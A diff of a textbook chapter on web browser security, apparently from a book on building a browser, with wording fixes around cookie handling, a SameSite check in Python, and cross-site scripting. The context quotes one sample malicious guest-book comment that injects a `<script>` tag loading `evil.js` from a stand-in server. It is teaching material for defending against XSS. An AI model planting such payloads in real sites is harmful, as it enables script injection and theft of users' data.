@@ -16,7 +16,7 @@ their misuse.
 ::: {.warning}
 Web security is a vast topic, covering browser, network, and
 applications security. It also involves educating the user, so that
-attackers can't misleading them into revealing their own secure data.
+attackers can't mislead them into revealing their own secure data.
 This chapter can't cover all of that: if you're writing web
 applications or other security-sensitive code, this book is not
 enough.
@@ -391,8 +391,8 @@ real browser as well---and log in and post as two different users.
 Note that `request` can be called multiple times to load a web page's
 HTML, CSS, and JavaScript resources. Later requests transmit cookies
 set by previous responses, so for example our guest book sets a cookie
-when requesting the page and then receives that cookie when our
-browser later requests the page's CSS file.
+when the browser first requests the page and then receives that
+cookie when our browser later requests the page's CSS file.
 
 Now that our browser supports cookies and uses them for logins, we
 need to make sure cookie data is safe from malicious actors. After
@@ -881,6 +881,7 @@ URL have the same host name:[^schemeful]
 ``` {.python}
 def request(url, top_level_url, payload=None):
     if host in COOKIE_JAR:
+        # ...
         cookie, params = COOKIE_JAR[host]
         allow_cookie = True
         if top_level_url and params.get("samesite", "none") == "lax":
@@ -890,6 +891,7 @@ def request(url, top_level_url, payload=None):
             allow_cookie = (host == top_level_host or method == "GET")
         if allow_cookie:
             body += "Cookie: {}\r\n".format(cookie)
+        # ...
 ```
 
 Note that we check whether the `top_level_url` is set---it won't be
@@ -935,9 +937,9 @@ out += "<p>" + entry + "\n"
 out += "<i>by " + who + "</i></p>"
 ```
 
-Note that `entry` can be anything, anything the user might stick into
-our comment form. That includes HTML tags, like a custom `<script>`
-tag! So, a malicious user could post this comment:
+Note that `entry` can be anything, including anything the user might
+stick into our comment form. That includes HTML tags, like a custom
+`<script>` tag! So, a malicious user could post this comment:
 
     Hi! <script src="http://my-server/evil.js"></script>
 
